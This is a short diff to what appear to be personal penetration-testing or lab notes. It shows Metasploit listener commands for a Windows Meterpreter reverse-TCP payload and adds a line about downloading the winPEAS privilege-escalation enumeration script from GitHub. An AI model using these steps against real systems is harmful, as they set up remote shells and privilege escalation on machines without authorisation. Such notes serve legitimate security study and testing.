@@ -21,4 +21,5 @@ Metaspilot Listner
 use exploit/multi/handler
 set PAYLOAD windows/meterpreter/reverse_tcp
 
-
+download winPEAS.bat (For Check Privilage)
+https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASbat/winPEAS.bat
